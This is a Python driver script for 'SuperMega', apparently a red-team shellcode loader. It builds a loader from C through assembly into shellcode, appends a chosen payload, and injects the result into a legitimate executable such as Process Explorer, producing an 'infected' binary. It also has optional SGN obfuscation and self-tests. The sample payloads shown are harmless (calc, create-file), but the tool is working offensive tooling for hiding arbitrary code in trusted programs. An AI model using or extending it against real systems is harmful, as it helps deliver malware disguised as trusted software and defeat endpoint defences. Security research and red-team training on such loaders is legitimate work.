import shutil
from enum import Enum
from helper import *
import argparse
from typing import Dict
import pickle

from model import *
from config import config
from pehelper import *
from phases.ctoasm import *
from phases.asmtoshc import *
from phases.shctoexe import *
from observer import observer


options_default = {
    "payload": "shellcodes/calc64.bin",
    "verify": False,

    # Temp
    "source_style": SourceStyle.peb_walk,

    # configuration
    "alloc_style": AllocStyle.RWX,
    "exec_style": ExecStyle.CALL,
    "copy_style": CopyStyle.SIMPLE,
    "dataref_style": DataRefStyle.APPEND,

    # injecting into exe
    "inject_exe": True,
    "inject_mode": "1,1",
    "inject_exe_in": "exes/procexp64.exe",
    "inject_exe_out": "out/procexp64-a.exe",

    "try_start_loader_shellcode": False,  # without payload (Debugging)
    "try_start_final_shellcode": False,    # with payload (should work)
    "try_start_final_infected_exe": True, # with payload (should work)

    # cleanup
    "cleanup_files_on_start": False,
    "cleanup_files_on_exit": False,

    # For debugging: Can disable some steps
    "generate_asm_from_c": True,  
    "generate_shc_from_asm": True, 

    # Not working atm
    "obfuscate_shc_loader": False,
    "test_obfuscated_shc": False,
}


# VERIFY: STD
# This will verify if our loader works
# - payload shellcode will create a file c:\temp\a
options_verify_std = {
    "payload": "shellcodes/createfile.bin",
    "verify": True,

    # Temp
    "source_style": SourceStyle.peb_walk,

    # configuration
    "alloc_style": AllocStyle.RWX,
    "exec_style": ExecStyle.CALL,
    "copy_style": CopyStyle.SIMPLE,
    "dataref_style": DataRefStyle.APPEND,

    # testing
    "try_start_loader_shellcode": False,
    "try_start_final_shellcode": False,
    "try_start_final_infected_exe": False,

    # injecting into exe
    "inject_exe": True,
    "inject_mode": "1,1",
    "inject_exe_in": "exes/procexp64.exe",
    "inject_exe_out": "out/procexp64-a.exe",

    # For debugging: Can disable some steps
    "generate_asm_from_c": True,        # phase 2
    "generate_shc_from_asm": True,      # phase 3
    
    # cleanup
    "cleanup_files_on_start": True,
    "cleanup_files_on_exit": True, # all is just in out/

    # doesnt work
    "obfuscate_shc_loader": False,
    "test_obfuscated_shc": False,
}


# VERIFY: IAT
# This will verify if our loader works
# - payload shellcode will create a file c:\temp\a
options_verify_iat = {
    "payload": "shellcodes/createfile.bin",
    "verify": True,

    # Temp
    "source_style": SourceStyle.peb_walk,
    
    # configuration
    "alloc_style": AllocStyle.RWX,
    "exec_style": ExecStyle.CALL,
    "copy_style": CopyStyle.SIMPLE,
    "dataref_style": DataRefStyle.APPEND,

    # testing
    "try_start_loader_shellcode": False,
    "try_start_final_shellcode": False,
    "try_start_final_infected_exe": False,

    # injecting into exe
    "inject_exe": True,
    "inject_mode": "1,1",
    "inject_exe_in": "exes/iattest-full.exe",  # important
    "inject_exe_out": "out/iatttest-full-a.exe",

    # For debugging: Can disable some steps
    "generate_asm_from_c": True,
    "generate_shc_from_asm": True,
    
    # cleanup
    "cleanup_files_on_start": True,
    "cleanup_files_on_exit": True, # all is just in out/

    # doesnt work
    "obfuscate_shc_loader": False,
    "test_obfuscated_shc": False,
}

options = None

main_c_file = os.path.join(build_dir, "main.c")
main_asm_file = os.path.join(build_dir, "main.asm")
main_exe_file = os.path.join(build_dir, "main.exe")
main_shc_file = os.path.join(build_dir, "main.bin")

debug_data = {
    "original_exe": b"",
    "infected_exe": b"",
}


def main():
    print("Super Mega")
    config.load()

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
    parser.add_argument('--verify', type=str, help='Debug: Perform verification: std/iat')
    args = parser.parse_args()

    if args.verify:
        if args.verify == "std":
            options = options_verify_std
        elif args.verify == "iat":
            options = options_verify_iat
        else:
            print("Unknown verify option {}, use std/iat".format(args.verify))
    else:
        options = options_default
        if args.shellcode:
            if not os.path.isfile(args.shellcode):
                print("Could not find: {}".format(args.shellcode))
                return
            options["payload"] = args.shellcode
        if args.inject:
            if not os.path.isfile(args.inject):
                print("Could not find: {}".format(args.inject))
                return
            options["inject_exe"] = True
            options["inject_exe_in"] = args.inject
            options["inject_exe_out"] = args.inject.replace(".exe", ".infected.exe")
    start(options)


def start(options):
    # Delete: all old files
    if options["cleanup_files_on_start"]:
        clean_files()

    # Check: Destination EXE capabilities
    capabilities = ExeCapabilities([
        "GetEnvironmentVariableW",
        "VirtualAlloc"
    ])
    capabilities.parse_from_exe(options["inject_exe_in"])
    capabilities.print()

    if capabilities.has_all():
        options["source_style"] = SourceStyle.iat_reuse
    else:
        options["source_style"] = SourceStyle.peb_walk

    observer.capabilities_a = capabilities
    observer.options = options

    print("--[ SourceStyle: {}".format(options["source_style"].name))

    # Copy: loader C files into working directory: build/
    if options["source_style"] == SourceStyle.peb_walk:
        observer.main_c = file_readall_text("source/peb_walk/main.c")
        shutil.copy("source/peb_walk/main.c", "build/main.c")
        shutil.copy("source/peb_walk/peb_lookup.h", "build/peb_lookup.h")
    elif options["source_style"] == SourceStyle.iat_reuse:
        observer.main_c = file_readall_text("source/iat_reuse/main.c")
        shutil.copy("source/iat_reuse/main.c", "build/main.c")

    # Convert: C -> ASM
    if options["generate_asm_from_c"]:
        # Find payload size
        with open(options["payload"], 'rb') as input2:
            data_payload = input2.read()
            payload_length = len(data_payload)
            observer.payload_asm_orig = data_payload
        asm = make_c_to_asm(main_c_file, main_asm_file, payload_length, capabilities)
        #observer.payload_asm_orig = asm["initial"]
        observer.payload_asm_cleanup = asm["cleanup"]
        observer.payload_asm_fixup = asm["fixup"]

    # Convert: ASM -> Shellcode
    if options["generate_shc_from_asm"]:
        code = make_shc_from_asm(main_asm_file, main_exe_file, main_shc_file)
        observer.loader_shellcode = code
    
    # Try: Starting the shellcode (rarely useful)
    if options["try_start_loader_shellcode"]:
        try_start_shellcode(main_shc_file)

    # SGN 
    #if options["obfuscate_shc_loader"]:
    #    obfuscate_shc_loader("main-clean.bin", "main-clean.bin")
    #
    #    if options["verify"]:
    #        if not verify_shellcode("main-clean.bin"):
    #            return

    # Merge shellcode/loader with payload
    if options["dataref_style"] == DataRefStyle.APPEND:
        print("--[ Merge stager: {} + {} -> {} ] ".format(main_shc_file, options["payload"], main_shc_file))
        with open(main_shc_file, 'rb') as input1:
            data_stager = input1.read()
        with open(options["payload"], 'rb') as input2:
            data_payload = input2.read()
        print("---[ Size: Stager: {} and Payload: {}  Sum: {} ]".format(
            len(data_stager), len(data_payload), len(data_stager)+len(data_payload)))

        with open(main_shc_file, 'wb') as output:
            data = data_stager + data_payload
            output.write(data)
            observer.final_shellcode = data

        if options["verify"] and options["source_style"] == SourceStyle.peb_walk:
            print("--[ Verify final shellcode ]")
            if not verify_shellcode(main_shc_file):
                print("Could not verify, still continuing")
                #return

        if options["try_start_final_shellcode"]:
            print("--[ Test Append shellcode ]")
            try_start_shellcode(main_shc_file)

        # copy it to out
        shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))

    # inject merged loader into an exe
    if options["inject_exe"]:
        debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])

        inject_exe(
            main_shc_file, 
            options["inject_exe_in"], 
            options["inject_exe_out"], 
            options["inject_mode"],
            capabilities)
        if options["verify"]:
            print("--[ Verify final exe ]")
            if verify_injected_exe(options["inject_exe_out"]):
                debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])

        if options["try_start_final_infected_exe"]:
            print("--[ Start infected exe ]")
            subprocess.run([
                options["inject_exe_out"],
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # dump the info i gathered
    file = open('latest.pickle', 'wb')
    pickle.dump(data, file)
    file.close()

    # delete files
    if options["cleanup_files_on_exit"]:
        clean_files()


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    print("--[ Convert with SGN ]")
    path_sgn = r'C:\training\tools\sgn\sgn.exe'
    subprocess.run([
        path_sgn,
        "--arch=64",
        "-i", "{}".format(file_shc_in),
        "-o", "{}".format(file_shc_out),
    ], check=True)
    if not os.path.isfile(file_shc_out):
        print("Error")
        return
    else:
        print("   > Success obfuscation")
        pass


def verify_shellcode(shc_name):
    print("---[ Verify shellcode: {} ]".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(verify_filename)):
        print("Error, directory does not exist for: {}".format(verify_filename))
        return
    
    # remove indicator file
    pathlib.Path(verify_filename).unlink(missing_ok=True)

    subprocess.run([
        config.get("path_runshc"),
        "{}".format(shc_name),
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # , check=True
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(verify_filename):
        print("---> Verify OK. Shellcode works (file was created)")
        os.remove(verify_filename)
        return True
    else:
        print("---> Verify FAIL. Shellcode doesnt work (file was not created)")
        return False
    

if __name__ == "__main__":
    main()

